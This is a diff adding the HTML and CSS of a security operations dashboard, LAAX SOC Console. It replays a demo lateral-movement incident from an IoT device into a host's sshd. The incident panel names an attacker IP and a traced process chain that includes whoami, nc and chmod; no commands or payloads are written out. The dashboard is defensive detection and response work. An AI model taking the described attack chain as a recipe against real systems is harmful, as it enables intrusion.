@@ -1,0 +1,1229 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--
+  LAAX SOC Console - the analyst-facing surface over C1..C4.
+  Every panel is populated from laax/contracts.py message types and the
+  lateral_movement scenario (seed 4) recorded in demo_evidence/windows_demo.txt.
+  Open this file directly in a browser; it has no build step and no runtime
+  dependency beyond the Google Fonts stylesheet (it degrades to system fonts
+  offline). See the provenance table at the foot of the page before quoting
+  any figure: measured, modelled and synthetic are labelled separately.
+-->
+<title>LAAX SOC Console</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600;700&display=swap">
+<style>
+:root{
+  color-scheme: light;
+  --plane:#f1f4f6; --surface:#ffffff; --surface-2:#f7f9fa; --surface-3:#eceff2;
+  --ink:#0f1418; --ink-2:#55606b; --ink-3:#87919b;
+  --line:#e0e5e9; --line-2:#c9d1d8;
+  --accent:#2a78d6; --accent-btn:#2a78d6; --accent-ink:#1c5cab; --accent-soft:rgba(42,120,214,.09); --accent-line:rgba(42,120,214,.32);
+  --good:#0ca30c; --warn:#fab219; --serious:#ec835a; --crit:#d03b3b;
+  --good-soft:rgba(12,163,12,.10); --warn-soft:rgba(250,178,25,.16);
+  --serious-soft:rgba(236,131,90,.14); --crit-soft:rgba(208,59,59,.10);
+  --grid:#e6eaee; --axis:#c9d1d8;
+  --s1:#2a78d6; --s2:#eb6834; --s1-fill:rgba(42,120,214,.16);
+  --shadow:0 1px 2px rgba(15,20,24,.05), 0 8px 22px -14px rgba(15,20,24,.30);
+  --r:10px;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    color-scheme: dark;
+    --plane:#0c0f12; --surface:#161a1f; --surface-2:#1b2027; --surface-3:#222831;
+    --ink:#eef2f6; --ink-2:#a6b0bb; --ink-3:#79838d;
+    --line:#252c34; --line-2:#39434d;
+    --accent:#3987e5; --accent-btn:#256abf; --accent-ink:#86b6ef; --accent-soft:rgba(57,135,229,.14); --accent-line:rgba(57,135,229,.40);
+    --good-soft:rgba(12,163,12,.16); --warn-soft:rgba(250,178,25,.14);
+    --serious-soft:rgba(236,131,90,.14); --crit-soft:rgba(208,59,59,.18);
+    --grid:#232931; --axis:#39434d;
+    --s1:#3987e5; --s2:#d95926; --s1-fill:rgba(57,135,229,.20);
+    --shadow:0 1px 2px rgba(0,0,0,.40), 0 10px 26px -16px rgba(0,0,0,.80);
+  }
+}
+:root[data-theme="dark"]{
+  color-scheme: dark;
+  --plane:#0c0f12; --surface:#161a1f; --surface-2:#1b2027; --surface-3:#222831;
+  --ink:#eef2f6; --ink-2:#a6b0bb; --ink-3:#79838d;
+  --line:#252c34; --line-2:#39434d;
+  --accent:#3987e5; --accent-btn:#256abf; --accent-ink:#86b6ef; --accent-soft:rgba(57,135,229,.14); --accent-line:rgba(57,135,229,.40);
+  --good-soft:rgba(12,163,12,.16); --warn-soft:rgba(250,178,25,.14);
+  --serious-soft:rgba(236,131,90,.14); --crit-soft:rgba(208,59,59,.18);
+  --grid:#232931; --axis:#39434d;
+  --s1:#3987e5; --s2:#d95926; --s1-fill:rgba(57,135,229,.20);
+  --shadow:0 1px 2px rgba(0,0,0,.40), 0 10px 26px -16px rgba(0,0,0,.80);
+}
+
+*{box-sizing:border-box}
+body{
+  background:var(--plane); color:var(--ink);
+  font-family:"IBM Plex Sans", system-ui, -apple-system, "Segoe UI", sans-serif;
+  font-size:14px; line-height:1.5; -webkit-font-smoothing:antialiased;
+}
+.mono{font-family:"IBM Plex Mono", ui-monospace, SFMono-Regular, Menlo, monospace}
+h1,h2,h3{margin:0; text-wrap:balance; font-weight:600; letter-spacing:-.01em}
+:focus-visible{outline:2px solid var(--accent); outline-offset:2px; border-radius:4px}
+@media (prefers-reduced-motion:reduce){*{animation-duration:.01ms !important; transition-duration:.01ms !important}}
+
+.eyebrow{
+  font-family:"IBM Plex Mono", monospace; font-size:10px; font-weight:500;
+  letter-spacing:.11em; text-transform:uppercase; color:var(--ink-3);
+}
+.shell{max-width:1580px; margin:0 auto; padding:0 20px 56px}
+
+/* ---------- top bar ---------- */
+.topbar{
+  position:sticky; top:0; z-index:40;
+  display:flex; align-items:center; gap:14px; flex-wrap:wrap;
+  padding:11px 20px; margin:0 0 18px;
+  background:var(--surface);
+  border-bottom:1px solid var(--line);
+}
+.brand{display:flex; align-items:center; gap:10px}
+.brand-mark{width:26px; height:26px; border-radius:7px; flex:none; background:var(--accent); position:relative}
+.brand-mark::before,.brand-mark::after{content:""; position:absolute; background:var(--surface); border-radius:1px}
+.brand-mark::before{left:6px; top:7px; width:3px; height:12px; opacity:.55}
+.brand-mark::after{left:12px; top:11px; width:3px; height:8px}
+.brand-name{font-size:15px; font-weight:700; letter-spacing:.02em; line-height:1.2}
+.brand-sub{font-size:11px; color:var(--ink-3); line-height:1.2}
+.topbar-spacer{flex:1 1 auto}
+.chip{
+  display:inline-flex; align-items:center; gap:6px;
+  padding:4px 9px; border-radius:999px; border:1px solid var(--line-2);
+  font-family:"IBM Plex Mono", monospace; font-size:11px; color:var(--ink-2);
+  background:var(--surface-2); white-space:nowrap;
+}
+.chip .dot{width:6px; height:6px; border-radius:50%; background:var(--ink-3); flex:none}
+.chip.live{border-color:var(--accent-line); color:var(--accent-ink); background:var(--accent-soft)}
+.chip.live .dot{background:var(--accent); animation:pulse 2.4s ease-in-out infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+
+/* ---------- posture tiles ---------- */
+.posture{display:grid; grid-template-columns:repeat(4,1fr); gap:12px; margin-bottom:14px}
+.tile{
+  background:var(--surface); border:1px solid var(--line); border-radius:var(--r);
+  padding:13px 15px 14px 18px; box-shadow:var(--shadow); position:relative; overflow:hidden;
+}
+.tile::before{content:""; position:absolute; left:0; top:0; bottom:0; width:3px; background:var(--line-2)}
+.tile.is-crit::before{background:var(--crit)}
+.tile.is-warn::before{background:var(--warn)}
+.tile.is-good::before{background:var(--good)}
+.tile.is-accent::before{background:var(--accent)}
+.tile-val{font-size:26px; font-weight:600; letter-spacing:-.02em; line-height:1.2; margin-top:5px}
+.tile-val small{font-size:13px; font-weight:500; color:var(--ink-2); letter-spacing:0}
+.tile-note{font-size:12px; color:var(--ink-2); margin-top:3px}
+
+/* ---------- transport ---------- */
+.transport{
+  background:var(--surface); border:1px solid var(--line); border-radius:var(--r);
+  padding:12px 16px 14px; box-shadow:var(--shadow); margin-bottom:14px;
+}
+.transport-head{display:flex; align-items:center; gap:12px; flex-wrap:wrap; margin-bottom:11px}
+.btn{
+  font:inherit; font-size:12.5px; font-weight:500;
+  display:inline-flex; align-items:center; gap:7px;
+  padding:6px 12px; border-radius:7px; cursor:pointer;
+  border:1px solid var(--line-2); background:var(--surface-2); color:var(--ink);
+  transition:background .14s ease, border-color .14s ease, color .14s ease;
+}
+.btn:hover{background:var(--surface-3); border-color:var(--ink-3)}
+.btn.primary{background:var(--accent-btn); border-color:var(--accent-btn); color:#fff}
+.btn.primary:hover{background:var(--accent-ink); border-color:var(--accent-ink)}
+.btn.danger{color:var(--crit); border-color:color-mix(in srgb, var(--crit) 40%, var(--line-2))}
+.btn.danger:hover{background:var(--crit-soft); border-color:var(--crit)}
+.btn[disabled]{opacity:.4; cursor:not-allowed}
+.btn[disabled]:hover{background:var(--surface-2); border-color:var(--line-2)}
+.seg{display:inline-flex; border:1px solid var(--line-2); border-radius:7px; overflow:hidden}
+.seg button{
+  font:inherit; font-family:"IBM Plex Mono", monospace; font-size:11.5px;
+  padding:6px 10px; background:var(--surface-2); color:var(--ink-2);
+  border:0; border-right:1px solid var(--line-2); cursor:pointer;
+}
+.seg button:last-child{border-right:0}
+.seg button[aria-pressed="true"]{background:var(--accent-soft); color:var(--accent-ink); font-weight:600}
+.clockread{font-family:"IBM Plex Mono", monospace; font-size:12px; color:var(--ink-2); font-variant-numeric:tabular-nums}
+.clockread b{color:var(--ink); font-weight:600}
+
+.track{position:relative; height:40px}
+.phases{position:absolute; inset:0 0 20px 0; display:flex; border-radius:6px; overflow:hidden; border:1px solid var(--line)}
+.phase{
+  display:flex; align-items:center; padding:0 8px; min-width:0;
+  font-family:"IBM Plex Mono", monospace; font-size:10px; letter-spacing:.06em;
+  text-transform:uppercase; color:var(--ink-3); background:var(--surface-2);
+  border-right:1px solid var(--line); white-space:nowrap; overflow:hidden;
+  transition:background .2s ease, color .2s ease;
+}
+.phase:last-child{border-right:0}
+.phase.on{background:var(--accent-soft); color:var(--accent-ink); font-weight:600}
+.playhead{position:absolute; top:0; bottom:20px; width:2px; background:var(--crit); pointer-events:none}
+.playhead::after{content:""; position:absolute; top:-3px; left:-3px; width:8px; height:8px; border-radius:50%; background:var(--crit)}
+.scrub{
+  position:absolute; left:0; right:0; bottom:0; width:100%; margin:0;
+  -webkit-appearance:none; appearance:none; background:transparent; height:20px; cursor:pointer;
+}
+.scrub::-webkit-slider-runnable-track{height:4px; background:var(--line-2); border-radius:2px}
+.scrub::-moz-range-track{height:4px; background:var(--line-2); border-radius:2px}
+.scrub::-webkit-slider-thumb{-webkit-appearance:none; width:14px; height:14px; margin-top:-5px; border-radius:50%; background:var(--accent); border:2px solid var(--surface)}
+.scrub::-moz-range-thumb{width:14px; height:14px; border-radius:50%; background:var(--accent); border:2px solid var(--surface)}
+
+/* ---------- cards ---------- */
+.main{display:grid; grid-template-columns:238px minmax(0,1fr) 336px; gap:14px; align-items:start}
+.card{background:var(--surface); border:1px solid var(--line); border-radius:var(--r); box-shadow:var(--shadow); overflow:hidden}
+.card-head{
+  display:flex; align-items:center; gap:10px; justify-content:space-between;
+  padding:10px 15px; border-bottom:1px solid var(--line); background:var(--surface-2);
+}
+.card-head h2{font-size:12.5px; font-weight:600}
+.card-body{padding:15px}
+.card-body.flush{padding:0}
+.stack{display:flex; flex-direction:column; gap:14px}
+
+/* ---------- incident queue ---------- */
+.queue{display:flex; flex-direction:column}
+.qitem{
+  display:block; width:100%; text-align:left; font:inherit; cursor:pointer;
+  padding:11px 14px 11px 16px; background:var(--surface); color:var(--ink);
+  border:0; border-bottom:1px solid var(--line); position:relative;
+}
+.qitem::before{content:""; position:absolute; left:0; top:0; bottom:0; width:3px; background:transparent}
+.qitem[aria-current="true"]{background:var(--accent-soft)}
+.qitem[aria-current="true"]::before{background:var(--accent)}
+.qitem:hover{background:var(--surface-3)}
+.qitem[aria-current="true"]:hover{background:var(--accent-soft)}
+.qrow{display:flex; align-items:center; justify-content:space-between; gap:8px}
+.qid{font-family:"IBM Plex Mono", monospace; font-size:11px; color:var(--ink-3)}
+.qtitle{font-size:13px; font-weight:500; margin:3px 0 5px; line-height:1.35}
+.qmeta{font-family:"IBM Plex Mono", monospace; font-size:10.5px; color:var(--ink-2); font-variant-numeric:tabular-nums}
+
+.alerts{border-top:1px solid var(--line); padding:12px 14px 14px}
+.alerts-head{margin-bottom:9px}
+.arow{padding:9px 0; border-bottom:1px solid var(--line)}
+.arow:last-child{border-bottom:0; padding-bottom:0}
+.arow-top{display:flex; align-items:baseline; justify-content:space-between; gap:8px}
+.arow-id{font-family:"IBM Plex Mono", monospace; font-size:10.5px; color:var(--ink-3); font-variant-numeric:tabular-nums}
+.arow-conf{font-family:"IBM Plex Mono", monospace; font-size:11px; color:var(--ink); font-weight:600}
+.arow-chain{font-family:"IBM Plex Mono", monospace; font-size:11px; color:var(--ink-2); margin-top:4px; word-break:break-word}
+.arow-out{font-size:11.5px; color:var(--ink-2); margin-top:5px; display:flex; align-items:center; gap:6px}
+.arow-out .pip{width:5px; height:5px; border-radius:50%; flex:none; background:var(--ink-3)}
+.arow-out.applied .pip{background:var(--crit)}
+.arow-out.absorbed .pip{background:var(--warn)}
+.alerts-empty{font-size:11.5px; color:var(--ink-3); font-style:italic; line-height:1.5}
+
+.sev{
+  display:inline-flex; align-items:center; gap:5px; padding:2px 7px; border-radius:5px;
+  font-family:"IBM Plex Mono", monospace; font-size:10px; font-weight:600;
+  letter-spacing:.07em; text-transform:uppercase; border:1px solid;
+}
+.sev .glyph{font-size:9px}
+.sev-critical{color:var(--crit); background:var(--crit-soft); border-color:color-mix(in srgb, var(--crit) 38%, transparent)}
+.sev-high{color:var(--serious); background:var(--serious-soft); border-color:color-mix(in srgb, var(--serious) 45%, transparent)}
+.sev-medium{color:var(--ink-2); background:var(--warn-soft); border-color:color-mix(in srgb, var(--warn) 55%, transparent)}
+.sev-low{color:var(--ink-2); background:var(--surface-3); border-color:var(--line-2)}
+.sev-good{color:var(--good); background:var(--good-soft); border-color:color-mix(in srgb, var(--good) 38%, transparent)}
+
+/* ---------- incident detail ---------- */
+.inc-head{padding:16px 18px; border-bottom:1px solid var(--line)}
+.inc-title{font-size:19px; font-weight:600; letter-spacing:-.02em; margin:7px 0 8px}
+.inc-facts{display:flex; flex-wrap:wrap; gap:6px 18px; font-family:"IBM Plex Mono", monospace; font-size:11.5px; color:var(--ink-2)}
+.inc-facts b{color:var(--ink); font-weight:600}
+
+.section{padding:16px 18px; border-bottom:1px solid var(--line)}
+.section:last-child{border-bottom:0}
+.section-head{display:flex; align-items:baseline; justify-content:space-between; gap:12px; margin-bottom:12px}
+.explain{
+  font-size:13px; color:var(--ink-2); line-height:1.6; margin:0;
+  padding:11px 13px; background:var(--surface-2); border-left:2px solid var(--accent);
+  border-radius:0 6px 6px 0;
+}
+.explain b{color:var(--ink); font-weight:600}
+
+.chainwrap{overflow-x:auto; padding-bottom:4px}
+.chain{display:block; width:100%; min-width:660px; height:auto}
+.chain .nlabel{font-family:"IBM Plex Mono", monospace; font-size:11px; fill:var(--ink)}
+.chain .nsub{font-family:"IBM Plex Mono", monospace; font-size:9.5px; fill:var(--ink-3)}
+.chain .ekind{font-family:"IBM Plex Mono", monospace; font-size:9px; fill:var(--ink-3); letter-spacing:.05em}
+.chain .band{font-family:"IBM Plex Mono", monospace; font-size:9px; fill:var(--ink-3); letter-spacing:.09em}
+
+table.data{width:100%; border-collapse:collapse; font-size:12.5px}
+table.data th{
+  text-align:left; font-family:"IBM Plex Mono", monospace; font-size:10px; font-weight:500;
+  letter-spacing:.08em; text-transform:uppercase; color:var(--ink-3);
+  padding:0 10px 7px 0; border-bottom:1px solid var(--line); white-space:nowrap;
+}
+table.data td{padding:8px 10px 8px 0; border-bottom:1px solid var(--line); vertical-align:top}
+table.data tr:last-child td{border-bottom:0}
+table.data td.num{font-family:"IBM Plex Mono", monospace; font-variant-numeric:tabular-nums; white-space:nowrap}
+table.data .argv{font-family:"IBM Plex Mono", monospace; font-size:11.5px; color:var(--ink); word-break:break-all}
+.empty{padding:16px 0; color:var(--ink-3); font-size:12.5px; font-style:italic}
+tr.fresh{animation:slidein .45s ease}
+@keyframes slidein{from{background:var(--accent-soft); transform:translateY(-3px)}to{background:transparent; transform:none}}
+
+.tag{
+  display:inline-block; padding:1px 6px; border-radius:4px; border:1px solid var(--line-2);
+  font-family:"IBM Plex Mono", monospace; font-size:10px; color:var(--ink-2); background:var(--surface-2);
+  white-space:nowrap;
+}
+.tag.deep{color:var(--crit); border-color:color-mix(in srgb, var(--crit) 35%, transparent); background:var(--crit-soft)}
+.tag.ext{color:var(--accent-ink); border-color:var(--accent-line); background:var(--accent-soft)}
+
+.actions{display:flex; flex-wrap:wrap; gap:8px}
+.actions-note{font-size:11.5px; color:var(--ink-3); margin-top:10px; font-family:"IBM Plex Mono", monospace}
+
+/* ---------- right rail ---------- */
+.lease-ring{display:flex; align-items:center; gap:14px}
+.ring{flex:none}
+.ring-num{font-family:"IBM Plex Mono", monospace; font-size:15px; font-weight:600; fill:var(--ink); font-variant-numeric:tabular-nums}
+.ring-cap{font-family:"IBM Plex Mono", monospace; font-size:8px; fill:var(--ink-3); letter-spacing:.1em}
+.kv{display:grid; grid-template-columns:auto 1fr; gap:5px 12px; font-size:12px; margin-top:12px}
+.kv dt{font-family:"IBM Plex Mono", monospace; font-size:10.5px; color:var(--ink-3); letter-spacing:.05em; text-transform:uppercase; padding-top:1px}
+.kv dd{margin:0; color:var(--ink); font-size:12.5px}
+.cmd{
+  font-family:"IBM Plex Mono", monospace; font-size:10.5px; line-height:1.55;
+  background:var(--surface-2); border:1px solid var(--line); border-radius:6px;
+  padding:9px 10px; margin-top:11px; overflow-x:auto; white-space:pre; color:var(--ink-2);
+}
+.cmd .ok{color:var(--good)}
+.cmd .undo{color:var(--ink-3)}
+
+.stream{max-height:430px; overflow-y:auto; overflow-x:hidden}
+.ev-title{overflow-wrap:anywhere}
+.ev{display:grid; grid-template-columns:44px 30px 1fr; gap:9px; padding:8px 14px; border-bottom:1px solid var(--line); font-size:12px}
+.ev:last-child{border-bottom:0}
+.ev-t{font-family:"IBM Plex Mono", monospace; font-size:10.5px; color:var(--ink-3); font-variant-numeric:tabular-nums; padding-top:1px}
+.ev-c{
+  font-family:"IBM Plex Mono", monospace; font-size:10px; font-weight:600; text-align:center;
+  height:17px; line-height:15px; border-radius:4px; border:1px solid var(--line-2);
+  background:var(--surface-2); color:var(--ink-2);
+}
+.ev-body{min-width:0}
+.ev-title{color:var(--ink); line-height:1.35}
+.ev-topic{font-family:"IBM Plex Mono", monospace; font-size:10px; color:var(--ink-3); margin-top:2px}
+.ev.k-crit .ev-c{color:var(--crit); border-color:color-mix(in srgb, var(--crit) 38%, transparent); background:var(--crit-soft)}
+.ev.k-good .ev-c{color:var(--good); border-color:color-mix(in srgb, var(--good) 35%, transparent); background:var(--good-soft)}
+.ev.k-act .ev-c{color:var(--accent-ink); border-color:var(--accent-line); background:var(--accent-soft)}
+.ev.new{animation:slidein .5s ease}
+
+.health{display:flex; flex-direction:column; gap:11px}
+.hrow{display:flex; align-items:center; justify-content:space-between; gap:10px; font-size:12.5px}
+.hrow .lbl{display:flex; align-items:center; gap:7px; color:var(--ink-2)}
+.hrow .val{font-family:"IBM Plex Mono", monospace; font-size:12px; color:var(--ink); font-variant-numeric:tabular-nums}
+.hbar{height:4px; border-radius:2px; background:var(--surface-3); overflow:hidden; margin-top:5px}
+.hbar span{display:block; height:100%; background:var(--accent); border-radius:2px}
+
+/* ---------- analytics ---------- */
+.analytics{display:grid; grid-template-columns:repeat(3, minmax(0,1fr)); gap:14px; margin-top:14px}
+.chart-note{font-size:11.5px; color:var(--ink-3); margin-top:10px; line-height:1.5}
+.legend{display:flex; gap:14px; flex-wrap:wrap; margin-bottom:10px}
+.legend span{display:inline-flex; align-items:center; gap:6px; font-size:11.5px; color:var(--ink-2)}
+.swatch{width:9px; height:9px; border-radius:2px; flex:none}
+svg.plot{display:block; width:100%; height:auto; overflow:visible}
+svg.plot .grid{stroke:var(--grid); stroke-width:1}
+svg.plot .axis{stroke:var(--axis); stroke-width:1}
+svg.plot .tick{font-family:"IBM Plex Mono", monospace; font-size:9.5px; fill:var(--ink-3)}
+svg.plot .dlabel{font-family:"IBM Plex Mono", monospace; font-size:10px; fill:var(--ink-2)}
+svg.plot .hot{cursor:crosshair}
+.tip{
+  position:fixed; z-index:60; pointer-events:none; opacity:0; transition:opacity .1s ease;
+  background:var(--surface); border:1px solid var(--line-2); border-radius:7px;
+  box-shadow:var(--shadow); padding:8px 10px; font-size:11.5px; max-width:250px;
+}
+.tip.on{opacity:1}
+.tip .tt{font-family:"IBM Plex Mono", monospace; font-size:10px; color:var(--ink-3); letter-spacing:.06em; text-transform:uppercase}
+.tip .tv{font-size:13px; font-weight:600; margin-top:2px}
+.tip .td{color:var(--ink-2); font-size:11.5px; margin-top:2px}
+
+/* ---------- provenance ---------- */
+.prov{margin-top:14px}
+.prov table{width:100%; border-collapse:collapse; font-size:12.5px}
+.prov th{
+  text-align:left; font-family:"IBM Plex Mono", monospace; font-size:10px; font-weight:500;
+  letter-spacing:.08em; text-transform:uppercase; color:var(--ink-3);
+  padding:0 12px 8px 0; border-bottom:1px solid var(--line);
+}
+.prov td{padding:9px 12px 9px 0; border-bottom:1px solid var(--line); vertical-align:top; color:var(--ink-2)}
+.prov td:first-child{color:var(--ink); font-weight:500; width:30%}
+.prov tr:last-child td{border-bottom:0}
+.badge{
+  display:inline-block; padding:1px 6px; border-radius:4px;
+  font-family:"IBM Plex Mono", monospace; font-size:9.5px; font-weight:600;
+  letter-spacing:.06em; text-transform:uppercase; border:1px solid;
+}
+.badge.measured{color:var(--good); background:var(--good-soft); border-color:color-mix(in srgb, var(--good) 35%, transparent)}
+.badge.modelled{color:var(--serious); background:var(--serious-soft); border-color:color-mix(in srgb, var(--serious) 45%, transparent)}
+.badge.synthetic{color:var(--ink-2); background:var(--surface-3); border-color:var(--line-2)}
+
+.foot{margin-top:26px; padding-top:16px; border-top:1px solid var(--line); font-size:12px; color:var(--ink-3); line-height:1.6}
+
+.toast{
+  position:fixed; left:50%; bottom:26px; transform:translate(-50%, 14px);
+  background:var(--surface); border:1px solid var(--line-2); border-radius:8px;
+  box-shadow:var(--shadow); padding:10px 15px; font-size:13px; z-index:70;
+  opacity:0; transition:opacity .18s ease, transform .18s ease; pointer-events:none; max-width:min(560px, 90vw);
+}
+.toast.on{opacity:1; transform:translate(-50%, 0)}
+.toast .mono{font-size:11px; color:var(--ink-3); display:block; margin-top:2px}
+
+@media (max-width:1240px){
+  .main{grid-template-columns:minmax(0,1fr) 320px}
+  .col-queue{grid-column:1 / -1}
+  .queue{flex-direction:row; overflow-x:auto}
+  .qitem{min-width:230px; border-bottom:0; border-right:1px solid var(--line)}
+  .analytics{grid-template-columns:1fr 1fr}
+  .posture{grid-template-columns:1fr 1fr}
+}
+@media (max-width:900px){
+  .main{grid-template-columns:minmax(0,1fr)}
+  .analytics{grid-template-columns:1fr}
+}
+</style>
+<style>
+body{margin:0}
+img{max-width:100%}
+[hidden]{display:none !important}
+</style>
+</head>
+<body>
+<header class="topbar">
+  <div class="brand">
+    <div class="brand-mark" aria-hidden="true"></div>
+    <div>
+      <div class="brand-name">LAAX</div>
+      <div class="brand-sub">Hybrid XDR &middot; SOC console</div>
+    </div>
+  </div>
+  <span class="chip"><span class="dot"></span>site: plant-north</span>
+  <span class="chip">analyst: on shift</span>
+  <div class="topbar-spacer"></div>
+  <span class="chip live"><span class="dot"></span><span id="mode-chip">replay &middot; lateral_movement</span></span>
+  <span class="chip mono" id="bus-chip">bus 0 msg</span>
+</header>
+
+<div class="shell">
+
+  <section class="posture" aria-label="Fleet posture">
+    <div class="tile is-crit" id="tile-inc">
+      <div class="eyebrow">Open incidents</div>
+      <div class="tile-val" id="v-inc">0</div>
+      <div class="tile-note" id="n-inc">baseline window &mdash; nothing correlated</div>
+    </div>
+    <div class="tile is-good" id="tile-cont">
+      <div class="eyebrow">Containment</div>
+      <div class="tile-val" id="v-cont">none</div>
+      <div class="tile-note" id="n-cont">no active leases</div>
+    </div>
+    <div class="tile is-accent">
+      <div class="eyebrow">Agent tracing depth</div>
+      <div class="tile-val" id="v-deep">0 <small>of 65 processes deep</small></div>
+      <div class="tile-note" id="n-deep">duty cycle 0.00% &middot; light mode fleet-wide</div>
+    </div>
+    <div class="tile">
+      <div class="eyebrow">Monitored estate</div>
+      <div class="tile-val">1 <small>host</small> &middot; 2 <small>IoT devices</small></div>
+      <div class="tile-note">host-0 agent-based &middot; iot-01, iot-07 agentless</div>
+    </div>
+  </section>
+
+  <section class="transport" aria-label="Incident replay">
+    <div class="transport-head">
+      <button class="btn primary" id="play"><span class="glyph" id="play-glyph">&#9654;</span><span id="play-label">Play incident</span></button>
+      <button class="btn" id="reset"><span class="glyph">&#8635;</span>Reset</button>
+      <div class="seg" role="group" aria-label="Playback speed">
+        <button type="button" data-speed="0.5" aria-pressed="false">0.5&times;</button>
+        <button type="button" data-speed="1" aria-pressed="true">1&times;</button>
+        <button type="button" data-speed="4" aria-pressed="false">4&times;</button>
+        <button type="button" data-speed="12" aria-pressed="false">12&times;</button>
+      </div>
+      <div class="topbar-spacer"></div>
+      <div class="clockread">t + <b id="clock">0.00</b> s &middot; <span id="evcount">0</span> / <span id="evtotal">0</span> events</div>
+    </div>
+    <div class="track">
+      <div class="phases" id="phases"></div>
+      <div class="playhead" id="playhead" style="left:0"></div>
+      <input class="scrub" id="scrub" type="range" min="0" max="8.4" step="0.01" value="0" aria-label="Scrub incident timeline">
+    </div>
+  </section>
+
+  <div class="main">
+
+    <div class="col-queue">
+      <div class="card">
+        <div class="card-head"><h2>Incident queue</h2><span class="eyebrow" id="queue-count">1 open</span></div>
+        <div class="card-body flush">
+          <div class="queue" id="queue" role="tablist" aria-label="Incident queue"></div>
+          <div class="alerts">
+            <div class="alerts-head"><span class="eyebrow">Correlation alerts in this incident</span></div>
+            <div id="alert-list"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="stack">
+      <div class="card">
+        <div class="inc-head">
+          <div class="qrow">
+            <span class="eyebrow" id="inc-id">INC-0042 &middot; alert 9f2c41ab7e05</span>
+            <span class="sev sev-critical" id="inc-sev"><span class="glyph">&#9679;</span>critical</span>
+          </div>
+          <h1 class="inc-title" id="inc-title">IoT beachhead pivoting into managed host <span class="mono">host-0</span></h1>
+          <div class="inc-facts">
+            <span>technique <b>lateral_movement</b></span>
+            <span>confidence <b id="inc-conf">0.990</b></span>
+            <span>source <b>iot-07</b></span>
+            <span>target <b>host-0 / pid 1400 sshd</b></span>
+            <span>detected by <b>C3 correlation</b></span>
+          </div>
+        </div>
+
+        <div class="section">
+          <div class="section-head">
+            <h2 class="eyebrow">Correlated path &mdash; C3 multi-partite graph</h2>
+            <span class="eyebrow" id="graph-stat">135 nodes &middot; 242 edges</span>
+          </div>
+          <div class="chainwrap">
+            <svg class="chain" id="chain" viewBox="0 0 900 236" role="img"
+              aria-label="Correlation path: IoT device iot-07 to attacker IP 66.42.13.90 to socket on port 22 to sshd pid 1400, whose deep-traced subtree runs bash, whoami, uname, nc and chmod.">
+            </svg>
+          </div>
+          <p class="explain" id="explain">
+            <b>Why this fired.</b> IoT flow score 0.98 reaches <b>sshd (pid 1400)</b> via a socket on
+            <span class="mono">10.0.0.12:22</span>; structural novelty <b>1.00</b> against the benign
+            graph baseline. The device address and the host process share a socket node that never
+            appeared in the learned window.
+          </p>
+        </div>
+
+        <div class="section">
+          <div class="section-head">
+            <h2 class="eyebrow">Deep-mode capture &mdash; C1 adaptive agent</h2>
+            <span class="eyebrow" id="capture-stat">0 captured &middot; 0 suppressed</span>
+          </div>
+          <table class="data">
+            <thead>
+              <tr><th>pid</th><th>process</th><th>argv &mdash; visible only in deep mode</th><th>conf</th><th>trigger</th><th>switch</th></tr>
+            </thead>
+            <tbody id="deep-rows"><tr><td colspan="6" class="empty">Agent is in light mode. No argv is being captured &mdash; this is the steady state the overhead claim rests on.</td></tr></tbody>
+          </table>
+        </div>
+
+        <div class="section">
+          <div class="section-head">
+            <h2 class="eyebrow">Analyst response</h2>
+            <span class="eyebrow">every action is reversible and logged</span>
+          </div>
+          <div class="actions">
+            <button class="btn" id="a-extend">&#8635; Extend lease +5 min</button>
+            <button class="btn danger" id="a-escalate">&#9650; Escalate &mdash; isolate host-0</button>
+            <button class="btn" id="a-release">&#10005; Release containment now</button>
+            <button class="btn" id="a-fp">&#10003; Mark false positive</button>
+          </div>
+          <div class="actions-note" id="action-note">
+            Release publishes Rollback(reason=analyst_override) &middot; False positive publishes Rollback(reason=disproved)
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="stack">
+      <div class="card">
+        <div class="card-head"><h2>Containment ledger &mdash; C4</h2><span class="sev sev-low" id="c4-state">idle</span></div>
+        <div class="card-body">
+          <div class="lease-ring">
+            <svg class="ring" width="76" height="76" viewBox="0 0 76 76" aria-hidden="true">
+              <circle cx="38" cy="38" r="31" fill="none" stroke="var(--surface-3)" stroke-width="6"></circle>
+              <circle id="ring-arc" cx="38" cy="38" r="31" fill="none" stroke="var(--crit)" stroke-width="6"
+                      stroke-linecap="round" stroke-dasharray="194.8" stroke-dashoffset="194.8"
+                      transform="rotate(-90 38 38)"></circle>
+              <text class="ring-num" id="ring-num" x="38" y="38" text-anchor="middle">&mdash;</text>
+              <text class="ring-cap" x="38" y="50" text-anchor="middle">LEASE</text>
+            </svg>
+            <div>
+              <div class="eyebrow">Selected level</div>
+              <div style="font-size:17px; font-weight:600; margin-top:3px" id="c4-level">&mdash;</div>
+              <div style="font-size:12px; color:var(--ink-2); margin-top:2px" id="c4-target">no target under containment</div>
+            </div>
+          </div>
+          <dl class="kv">
+            <dt>rationale</dt><dd id="c4-rationale">&mdash;</dd>
+            <dt>asset class</dt><dd id="c4-asset">&mdash;</dd>
+            <dt>layers</dt><dd id="c4-layer">&mdash;</dd>
+            <dt>policy</dt><dd class="mono" id="c4-policy">&mdash;</dd>
+          </dl>
+          <div class="cmd" id="c4-cmd">sdn$ <span class="undo">awaiting policy decision</span></div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-head"><h2>Sensor health</h2><span class="eyebrow">this host</span></div>
+        <div class="card-body">
+          <div class="health">
+            <div>
+              <div class="hrow"><span class="lbl">Tracing duty cycle</span><span class="val" id="h-duty">0.00%</span></div>
+              <div class="hbar"><span id="h-duty-bar" style="width:0%"></span></div>
+            </div>
+            <div class="hrow"><span class="lbl">Worst mode switch</span><span class="val" id="h-worst">&mdash;</span></div>
+            <div class="hrow"><span class="lbl">Latency budget</span><span class="val"><span class="sev sev-good"><span class="glyph">&#10003;</span>500 ms</span></span></div>
+            <div class="hrow"><span class="lbl">LSM enforcement</span><span class="val" id="h-lsm">disarmed</span></div>
+            <div class="hrow"><span class="lbl">Latency source</span><span class="val"><span class="badge modelled">modelled</span></span></div>
+            <div class="hrow"><span class="lbl">C3 GNN baseline</span><span class="val">loss 0.00013</span></div>
